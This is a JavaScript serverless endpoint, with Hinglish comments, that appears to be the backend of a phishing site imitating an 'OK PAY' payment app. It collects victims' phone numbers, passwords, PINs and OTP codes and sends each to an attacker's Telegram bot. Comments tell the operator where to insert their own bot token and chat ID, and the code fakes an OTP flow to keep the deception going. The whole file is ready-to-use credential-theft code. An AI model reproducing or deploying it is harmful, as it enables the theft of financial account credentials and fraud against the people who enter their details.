export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { type, phone, pass, pin, otp } = req.body || {};

  // ⚠️ YAHAN APNA TELEGRAM BOT TOKEN AUR CHAT ID DAALEIN ⚠️
  const BOT_TOKEN = 'YAHAN_APNA_BOT_TOKEN_DALEIN'; 
  const CHAT_ID = 'YAHAN_APNI_CHAT_ID_DALEIN';

  async function sendTelegram(msg) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
      });
    } catch (e) { console.error('Telegram error:', e); }
  }

  if (type === 'login') {
    if (!phone || !pass || !pin) return res.status(400).json({ error: 'Missing fields' });
    
    // Telegram par login details bhejenge
    await sendTelegram(`🚀 *OK PAY Login Attempt*\n\n📱 *Phone:* ${phone}\n🔑 *Pass:* ${pass}\n🔢 *PIN:* ${pin}`);
    
    return res.status(200).json({ success: true });
  }

  if (type === 'send_otp') {
    const generatedOtp = Math.floor(100000 + Math.random() * 900000);
    
    // Telegram par OTP bhejenge
    await sendTelegram(`📲 *OTP Requested*\n\n📱 *Phone:* ${phone}\n🔐 *OTP:* ${generatedOtp}`);
    
    return res.status(200).json({ success: true, otp: generatedOtp });
  }

  if (type === 'verify_otp') {
    // Telegram par verify attempt bhejenge
    await sendTelegram(`✅ *OTP Entered*\n\n📱 *Phone:* ${phone}\n🔢 *OTP:* ${otp}`);
    
    return res.status(200).json({ success: true });
  }

  return res.status(200).json({ success: true });
}
